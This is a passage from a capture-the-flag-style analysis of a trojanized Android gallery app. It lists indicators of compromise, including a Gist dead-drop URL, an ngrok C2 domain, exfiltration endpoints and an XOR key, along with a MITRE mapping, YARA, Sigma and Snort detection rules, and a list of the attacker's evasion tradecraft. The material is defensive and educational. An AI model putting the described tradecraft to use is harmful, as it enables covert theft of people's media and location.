waiting for another app to activate GPS, since it cannot do so itself.
```

---

## `[07] INDICATORS OF COMPROMISE (IOCs)`

### Network Indicators

| IOC Type | Value |
|----------|-------|
| Dead-drop URL | `https://gist.githubusercontent.com/0wizlr/a2e4ba3849d1366678c2df925ee2cc4e/raw` |
| C2 Domain | `446d9f29543f.ngrok-free.app` |
| C2 Protocol | HTTPS |
| HTTP Pattern | `GET /cdn/assets` — module polling |
| HTTP Pattern | `POST /telemetry/inventory` — file recon |
| HTTP Pattern | `POST /api/backup/chunk` — media exfiltration |
| HTTP Pattern | `POST /api/location/update` — GPS data |

### Application Indicators

| Indicator | Value |
|-----------|-------|
| Malicious Class | `org.fossify.gallery.helpers.PeriodicTaskManager` |
| Module 1 | `com.media.scanner.FileScanner` |
| Module 2 | `com.media.geotagger.MetaDataParser` |
| Module 3 | `com.system.location.LocationTracker` |
| Background Service | `GeotagService/1.0` |
| XOR Key | `blastoise` |
| B64 Iterations | `15` |

### Behavioral Indicators

| Behavior | Detection Signal |
|----------|-----------------|
| App contacts `gist.githubusercontent.com` on launch | Suspicious for Gallery app |
| `InMemoryDexClassLoader` invoked at runtime | Dynamic code loading — high risk |
| `PASSIVE_PROVIDER` location listener registered | No location permission visible |
| Large HTTP POST from gallery app | Media exfiltration |
| Repeated `POST /api/location/update` every 30s | Persistent location polling |

---

## `[08] MITRE ATT&CK MAPPING`

| ID | Technique | Observed Behavior |
|----|-----------|-------------------|
| `T1436` | Commonly Used Port | HTTPS (443) used for all C2 comms |
| `T1481.003` | Web Service — Dead Drop Resolver | GitHub Gist used to resolve real C2 |
| `T1027` | Obfuscated Files | Base64 ×15 + XOR `blastoise` to hide C2 |
| `T1406` | Obfuscated Files (Android) | DEX payloads wrapped in protobuf |
| `T1624.001` | Event Triggered — Broadcast Receiver | PASSIVE_PROVIDER exploits other apps' GPS |
| `T1533` | Data from Local System | FileScanner enumerates DCIM/Docs/Downloads |
| `T1417` | Input Capture | LocationTracker collects GPS + cell + WiFi |
| `T1646` | Exfiltration Over C2 Channel | All data exfiltrated via `/api/*` endpoints |
| `T1407` | Download New Code at Runtime | `InMemoryDexClassLoader` loads C2 modules |

---

## `[09] DETECTION RULES`

### YARA

```yara
rule Android_DeadDrop_GistResolver {
    meta:
        description = "Detects Android malware using GitHub Gist as C2 dead-drop"
        author      = "Tamil05t — Arctic Howl S2"
        date        = "2026-03-18"

    strings:
        $gist_url   = "gist.githubusercontent.com"
        $b64_loop   = "const/16" nocase
        $xor_key    = "blastoise"
        $passive    = "PASSIVE_PROVIDER"
        $dex_load   = "InMemoryDexClassLoader"
        $c2_recon   = "/telemetry/inventory"

    condition:
        3 of them
}

rule Android_ModularRAT_DEXLoader {
    meta:
        description = "Detects in-memory DEX loading pattern used by Expanse Surveyor RAT"
        author      = "Tamil05t — Arctic Howl S2"

    strings:
        $dex_class  = "InMemoryDexClassLoader"
        $cdn_poll   = "/cdn/assets"
        $chunk_exfil= "/api/backup/chunk"
        $loc_update = "/api/location/update"

    condition:
        $dex_class and any of ($cdn_poll, $chunk_exfil, $loc_update)
}
```

### Sigma

```yaml
title: Android Malware — GitHub Gist Dead-Drop C2 Resolution
status: experimental
description: Detects Android app resolving C2 via GitHub Gist dead-drop
tags:
    - attack.command_and_control
    - attack.t1481.003
logsource:
    product: android
    category: network
detection:
    selection:
        destination_domain: 'gist.githubusercontent.com'
        process_name|contains: 'gallery'
    condition: selection
level: high

---

title: Android — In-Memory DEX Module Loading
status: experimental
description: Detects runtime DEX loading via InMemoryDexClassLoader
tags:
    - attack.defense_evasion
    - attack.t1407
logsource:
    product: android
    category: process_creation
detection:
    selection:
        class_name: 'dalvik.system.InMemoryDexClassLoader'
    filter:
        application|startswith:
            - 'com.google'
            - 'com.android'
    condition: selection and not filter
level: critical
```

### Snort

```snort
# Detect Gist dead-drop resolution by gallery app
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"MALWARE Android Gallery App GitHub Gist Dead-Drop Query";
    flow:to_server,established;
    content:"gist.githubusercontent.com"; nocase;
    content:"GET"; http_method;
    content:"/raw"; http_uri;
    classtype:trojan-activity;
    sid:2000001; rev:1;
)

# Detect media exfiltration chunks
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"MALWARE Android Chunked Media Exfiltration";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/backup/chunk"; http_uri;
    threshold:type both, track by_src, count 2, seconds 300;
    classtype:data-exfiltration;
    sid:2000002; rev:1;
)

# Detect persistent location polling
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"MALWARE Android Persistent Location Polling";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/location/update"; http_uri;
    threshold:type both, track by_src, count 5, seconds 300;
    classtype:policy-violation;
    sid:2000003; rev:1;
)
```

---

## `[10] LESSONS LEARNED`

### Attacker Tradecraft — Key Observations

```
[+] GitHub Gist dead-drop defeats static domain blocklisting entirely
[+] 15× Base64 + XOR defeats automated multi-pass decoders
[+] InMemoryDexClassLoader = zero disk artifacts — evades file forensics
[+] Base APK appears clean to Play Store / VirusTotal scanners
[+] PASSIVE_PROVIDER exploitation bypasses Android permission model
[+] ngrok relay hides true server IP — infrastructure never exposed
[+] Modular design allows C2 operator to update/swap capabilities post-deploy
```

### Defensive Gaps Exposed

```
[-] No runtime DEX loading detection on Android endpoint
[-] GitHub Gist connections not flagged as suspicious for gallery app
[-] No egress monitoring for chunked file uploads from mobile devices
[-] Android permission audit missed PASSIVE_PROVIDER abuse
[-] No behavioral analysis of app launch → external connection pattern
```

### Recommended Mitigations

| Priority | Action |
|----------|--------|
| 🔴 CRITICAL | Deploy Mobile EDR — alert on `InMemoryDexClassLoader` invocation |
| 🔴 CRITICAL | Block or monitor `gist.githubusercontent.com` from non-dev devices |
| 🟠 HIGH | Implement DNS monitoring for ngrok-free.app subdomains |
| 🟠 HIGH | Alert on repeated `POST /api/location/update` patterns |
| 🟡 MEDIUM | Review Android app permissions — flag PASSIVE_PROVIDER usage |
| 🟡 MEDIUM | Enforce app allowlisting — prevent sideloaded APK installation |
| 🟢 LOW | Regular APK integrity checks for installed applications |

---

## `[11] CONCLUSION`

Week 2 of the OffSec Arctic Howl Gauntlet escalated significantly in complexity — moving from macOS PCAP forensics to full **Android APK reverse engineering** combined with network traffic analysis. The challenge required decompiling a trojanized application, reversing a two-stage decoding scheme, extracting and analyzing dynamically-loaded modules, recovering exfiltrated media files, and understanding a nuanced Android permission exploitation technique.

All seven questions were answered correctly with a perfect score of **60/60**.

The malware's architecture — modular, memory-only, dead-drop-resolved — mirrors techniques seen in real-world mobile threat actors targeting journalists, activists, and high-value individuals. The PASSIVE_PROVIDER location exploitation in particular represents sophisticated understanding of Android internals.

### Final Scorecard

| Objective | Status |
|-----------|--------|
| Identify C2 discovery mechanism and dead-drop | `ACHIEVED ✅` |
| Reverse multi-layer decoding chain (B64×15 + XOR) | `ACHIEVED ✅` |
| Map file system reconnaissance scope | `ACHIEVED ✅` |
| Understand server-directed DEX module execution | `ACHIEVED ✅` |
| Extract and describe exfiltrated media files | `ACHIEVED ✅` |
| Analyze LocationTracker persistence behavior | `ACHIEVED ✅` |
| Identify PASSIVE_PROVIDER exploitation root cause | `ACHIEVED ✅` |

---

<div align="center">

```
╔═══════════════════════════════════════════════════════════════════╗
║  WEEK 2 — EXPANSE SURVEYOR — COMPLETE ✅  |  7/7  |  60/60 pts  ║
╚═══════════════════════════════════════════════════════════════════╝
```

*Report by Tamil05t · March 18, 2026 · OffSec Arctic Howl Gauntlet S2 · TLP:WHITE*

</div>
